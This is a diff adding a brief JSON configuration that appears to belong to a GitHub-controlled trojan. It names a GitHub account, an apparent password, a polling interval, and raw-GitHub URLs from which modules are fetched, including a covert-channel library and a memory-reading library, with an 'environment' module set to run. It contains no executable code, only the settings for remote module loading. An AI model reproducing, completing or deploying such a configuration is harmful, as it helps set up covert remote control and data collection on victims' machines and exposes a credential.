@@ -1,0 +1,14 @@
+{
+  "gu": "how2how",
+  "gp": "WWW.github.c0m",
+  "gr": "toy",
+  "cf": 60,
+  "bm": {
+    "toy": "https://raw.githubusercontent.com/how2how/toy/master",
+    "nacl": "https://raw.githubusercontent.com/how2how/toy/master/toy/external",
+    "covertutils": "https://raw.githubusercontent.com/how2how/toy/master/toy/external",
+    "memorpy": "https://raw.githubusercontent.com/how2how/toy/master/toy/external"
+  },
+  "tu": "https://raw.githubusercontent.com/how2how/toy/master/toy/modules/",
+  "rm": ["environment"]
+}
